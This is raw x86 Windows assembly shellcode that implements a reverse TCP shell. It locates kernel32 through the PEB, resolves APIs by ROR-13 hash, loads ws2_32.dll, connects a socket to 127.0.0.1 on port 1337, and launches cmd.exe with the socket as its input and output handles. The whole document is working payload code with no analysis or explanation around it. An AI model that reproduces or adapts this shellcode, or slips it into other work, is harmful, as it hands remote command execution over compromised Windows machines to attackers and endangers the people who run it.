start:
       mov ebp, esp
       sub esp, 0x628
   find_kernel32:                       
       xor ecx,ecx                     
       mov esi,fs:[ecx+30h]            
       mov esi,[esi+0Ch]               
       mov esi,[esi+1Ch]               
   next_module:                         
       mov ebx, [esi+8h]               
       mov edi, [esi+20h]              
       mov esi, [esi]                  
       cmp [edi+12*2], cx              
       jne next_module                 
   find_function_shorten:               
       jmp find_function_shorten_bnc   
   find_function_ret:                   
       pop esi                         
       mov [ebp+0x04], esi             
       jmp resolve_symbols_kernel32    
   find_function_shorten_bnc:           
       call find_function_ret          
   find_function:                       
       pushad                          
       mov eax, [ebx+0x3c]             
       mov edi, [ebx+eax+0x78]         
       add edi, ebx                    
       mov ecx, [edi+0x18]             
       mov eax, [edi+0x20]             
       add eax, ebx                    
       mov [ebp-4], eax                
   find_function_loop:                  
       jecxz find_function_finished    
       dec ecx                         
       mov eax, [ebp-4]                
       mov esi, [eax+ecx*4]            
       add esi, ebx                    
   compute_hash:                        
       xor eax, eax                    
       cdq                             
       cld                             
   compute_hash_again:                  
       lodsb                           
       test al, al                     
       jz compute_hash_finished        
       ror edx, 0x0d                   
       add edx, eax                    
       jmp compute_hash_again          
   compute_hash_finished:               
   find_function_compare:               
       cmp edx, [esp+0x24]             
       jnz find_function_loop          
       mov edx, [edi+0x24]             
       add edx, ebx                    
       mov cx, [edx+2*ecx]             
       mov edx, [edi+0x1c]             
       add edx, ebx                    
       mov eax, [edx+4*ecx]            
       add eax, ebx                    
       mov [esp+0x1c], eax             
   find_function_finished:              
       popad                           
       ret                             
   resolve_symbols_kernel32:            
       push 0x78b5b983
       call dword ptr [ebp+0x04]       
       mov [ebp+0x10], eax             
       push 0xec0e4e8e
       call dword ptr [ebp+0x04]       
       mov [ebp+0x14], eax             
       push 0x16b3fe72
       call dword ptr [ebp+0x04]
       mov [ebp+0x20], eax
       push 0x006c6c
       push 0x642e3233
       push 0x5f327377
       push esp
       call dword ptr [ebp+0x14]
       mov ebx, eax
       push 0x3bfcedcb
       call dword ptr [ebp+0x04]
       mov [ebp+0x24], eax
       push 0xadf509d9
       call dword ptr [ebp+0x04]
       mov [ebp+0x28], eax
       push 0xb32dba0c
       call dword ptr [ebp+0x04]
       mov [ebp+0x2c], eax
       mov esi, ebp
       jmp main
   ConnectTcp:
       push ebp
       mov ebp, esp
       sub esp, 0x18
       sub esp, 0x190
       mov [ebp-0x4], esp
       mov dword ptr [ebp-0x8], 0x202
       mov eax, [ebp+0x8]
       push 0x0
       push 0x0
       push eax
       push 0x0
       mov [ebp-0xc], esp
       mov eax, [ebp+0xc]
       rol ax, 8
       mov dword ptr [ebp+0xc], eax
       mov eax, [ebp+0xc]
       shl eax, 16
       mov dword ptr [ebp+0xc], eax
       mov eax, [ebp+0xc]
       add eax, 2
       mov dword ptr [ebp-0x10], eax
       mov eax, [ebp-0xc]
       mov ebx, [ebp-0x10]
       mov dword ptr [eax], ebx
       mov eax, [ebp-0x8]
       mov ebx, [ebp-0x4]
       push ebx
       push eax
       call dword ptr [esi+0x24]
       push 0x0
       push 0x0
       push 0x0
       push 0x6
       push 0x1
       push 0x2
       call dword ptr [esi+0x28]
       mov dword ptr [ebp-0x14], eax
       mov eax, [ebp-0x14]
       mov ebx, [ebp-0xc]
       push 0x0
       push 0x0
       push 0x0
       push 0x0
       push 0x10
       push ebx
       push eax
       call dword ptr [esi+0x2c]
       mov dword ptr [ebp-0x18], eax
       mov eax, [ebp-0x14]
       mov esp, ebp
       pop ebp
       ret
   ReverseTcpShell:
       push ebp
       mov ebp, esp
       sub esp, 0x14
       push 0x0657865
       push 0x2e646d63
       mov [ebp-0x4], esp
       mov eax, [ebp+0x8]
       mov ebx, [ebp+0xc]
       push ebx
       push eax
       call ConnectTcp
       mov dword ptr [ebp-0x8], eax
       sub esp, 0x44
       mov [ebp-0xc], esp
       mov dword ptr [ebp-0x10], 0x0
   while_stmt1:
       mov eax, [ebp-0x10]
       cmp eax, 0x11
       jge while_stmt1_end
       mov eax, [ebp-0xc]
       mov ebx, [ebp-0x10]
       sal ebx, 2
       add eax, ebx
       mov dword ptr [eax], 0x0
       mov eax, [ebp-0x10]
       add eax, 1
       mov dword ptr [ebp-0x10], eax
       jmp while_stmt1
   while_stmt1_end:
       mov eax, [ebp-0xc]
       add eax, 0x2c
       mov dword ptr [eax], 0x100
       mov eax, [ebp-0xc]
       add eax, 0x38
       mov ebx, [ebp-0x8]
       mov dword ptr [eax], ebx
       mov eax, [ebp-0xc]
       add eax, 0x3c
       mov ebx, [ebp-0x8]
       mov dword ptr [eax], ebx
       mov eax, [ebp-0xc]
       add eax, 0x40
       mov ebx, [ebp-0x8]
       mov dword ptr [eax], ebx
       sub esp, 0x10
       mov [ebp-0x14], esp
       mov eax, [ebp-0xc]
       mov dword ptr [eax], 0x44
       mov eax, [ebp-0x4]
       mov ebx, [ebp-0xc]
       mov ecx, [ebp-0x14]
       push ecx
       push ebx
       push 0x0
       push 0x0
       push 0x0
       push 0x1
       push 0x0
       push 0x0
       push eax
       push 0x0
       call dword ptr [esi+0x20]
       mov eax, 1
       mov esp, ebp
       pop ebp
       ret
   main:
       push ebp
       mov ebp, esp
       push 0x539
       push 0x100007f
       call ReverseTcpShell
       mov eax, 1
       mov esp, ebp
       pop ebp
       ret